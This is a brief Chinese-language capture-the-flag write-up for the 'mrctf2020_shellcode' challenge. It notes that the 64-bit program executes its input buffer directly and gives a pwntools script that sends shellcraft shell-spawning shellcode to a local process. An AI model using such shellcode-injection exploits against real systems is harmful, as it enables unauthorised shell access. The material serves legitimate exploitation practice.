checksec发现是64位程序

![image-20210410170306139](https://static.hack1s.fun/images/2021/04/10/image-20210410170306139.png)

IDA打开看main函数

![image-20210410170325818](https://static.hack1s.fun/images/2021/04/10/image-20210410170325818.png)

就是输入了一个buf直接跳过去了

直接用shellcraft发一个shell过去完事

```python
from pwn import *
io = process('./mrctf2020_shellcode')
payload = asm(shellcraft.amd64.sh(),arch='amd64',os='linux')
io.send(payload)
io.interactive()
```

